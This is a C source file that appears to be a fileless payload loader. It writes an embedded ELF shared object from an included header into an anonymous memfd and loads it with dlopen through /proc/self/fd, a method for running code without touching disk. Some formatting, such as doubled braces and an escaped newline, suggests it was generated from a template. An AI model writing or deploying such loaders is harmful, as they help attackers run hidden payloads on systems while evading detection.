#include "pkg/elf_sc.h"
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>

/* Reflective .so elf injection for linux */

int main() {

    // Create a file descriptor in memory
    int anon_elf_fd = memfd_create("", MFD_CLOEXEC);
    if (anon_elf_fd == -1) {
        perror("memfd_create");
        return EXIT_FAILURE;
    }

    // Write our elf into the file descriptor in memory
    write(anon_elf_fd, elf, elf_len);

    // reset file offset
    lseek(anon_elf_fd, 0, SEEK_SET); 

    // make the path to the memory file descriptor
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", anon_elf_fd);

    // load the shared object
    void *handle = dlopen(path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {{
        fprintf(stderr, "Error loading .so: %s\\n", dlerror());
        close(anon_elf_fd);
        return EXIT_FAILURE;
    }}

    dlclose(handle);
    return EXIT_SUCCESS;
}
